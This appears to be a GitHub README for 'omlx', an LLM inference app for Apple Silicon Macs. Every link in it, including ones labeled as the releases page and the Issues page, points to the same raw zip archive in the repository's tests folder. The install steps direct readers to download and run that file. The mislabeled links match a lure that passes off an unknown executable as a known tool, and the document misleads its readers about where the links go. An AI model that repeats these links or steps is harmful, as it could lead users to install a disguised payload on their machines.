# 🚀 omlx - Fast LLM Inference on Apple Silicon

[![Download omlx](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)

---

## 📖 What is omlx?

omlx is an application designed to speed up running large language models (LLMs) on Apple Silicon Macs. It works quietly in the background, handling requests from your apps and managing resources to make things smooth and fast. You control it easily from your Mac’s menu bar.

omlx uses smart tricks like continuous batching and fast storage caching. This helps models respond quicker without using too much space or power. It supports popular APIs, including OpenAI’s, to fit into many setups.

---

## 💻 System Requirements

To run omlx, your Mac should meet these basics:

- **Mac computer with Apple Silicon chip** (such as M1, M1 Pro, M1 Max, M2, or newer)  
- **macOS 12 or later**  
- At least **4 GB of free storage space** for caching and model files  
- Internet connection for initial setup and API communication  

Using Intel-based Macs or older macOS versions is not supported. Make sure your system is up to date for the best experience.

---

## 🚀 Features at a Glance

omlx is built to make using large language models easier for Mac users. It offers:

- **Fast inference:** Runs models optimized for Apple Silicon chips.  
- **Continuous batching:** Groups requests to speed up response times.  
- **SSD caching:** Stores model data on disk to reduce memory use and loading time.  
- **Menu bar control:** Start, stop, and monitor server easily from the Mac menu bar.  
- **OpenAI API compatible:** Works smoothly with apps using OpenAI’s API format.  
- **Lightweight:** Uses minimal system resources while running.

---

## 📥 Download & Install

To get started, visit the release page here:

[Download omlx on GitHub](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)

### Step 1: Visit the download page

Click the link above to open the omlx releases page on GitHub. This page lists all versions of the software.

### Step 2: Select the latest version

Look for the newest release by checking the dates. Usually, the latest version is at the top.

### Step 3: Download the macOS app

Find the file ending with `.dmg` or `.zip`. This file contains the app for your Mac. Click it to start the download.

### Step 4: Open and install

- For `.dmg` files: Double-click the file to open it. You’ll see the omlx app icon. Drag this icon into your Applications folder.  
- For `.zip` files: Double-click to unzip. Then move the omlx app file to the Applications folder.

### Step 5: Start omlx

Open your Applications folder and double-click the omlx app. You should see the omlx icon appear in the menu bar at the top of your screen.

---

## 🛠 How to Use omlx

Using omlx is simple and mostly automatic. Here’s how to get started:

### Open the menu bar app

Click the omlx icon in the menu bar. It will show you the current status and options.

### Start the server

Choose "Start Server" if it’s not running. The server listens for requests from your apps and handles running the language models.

### Check server status

The menu shows how many requests omlx is processing and how much caching is happening.

### Configure settings

You can adjust some preferences:

- Change model cache size  
- Enable or disable API compatibility mode  
- View logs for troubleshooting  

### Use with your applications

Point your LLM-enabled apps to `http://localhost:PORT` (usually 5000). omlx will respond instead of calling an online service.

---

## 🔄 Updating omlx

To keep omlx running smoothly:

1. Visit the [release page](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip) regularly.  
2. Download the newest `.dmg` or `.zip` file.  
3. Replace the old app in your Applications folder with the new one.  
4. Restart omlx to apply the update.

---

## 🔧 Troubleshooting

If something isn’t working:

- Make sure your Mac meets the system requirements.  
- Check if the omlx menu bar icon is visible and the server status is “running.”  
- Restart the app by quitting it and opening again.  
- Reboot your Mac if problems persist.  
- Check logs via the menu bar app for error messages.  
- Visit the [GitHub Issues page](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip) for known problems or to ask for help.

---

## 📝 About This Project

omlx is focused on providing Mac users a fast and efficient way to run large language models locally. Using methods like batching and SSD caching, it reduces wait times and resource use. This helps developers and end users integrate AI models without complex setup or slowdowns.

---

## 🏷️ Topics

apple-silicon, inference-server, llm, macos, mlx, openai-api

---

## 📄 License

omlx is open source under the MIT License. Check the LICENSE file in the repository for full terms.

---

## 🔗 Quick Link to Download

[Visit omlx Releases on GitHub to download](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)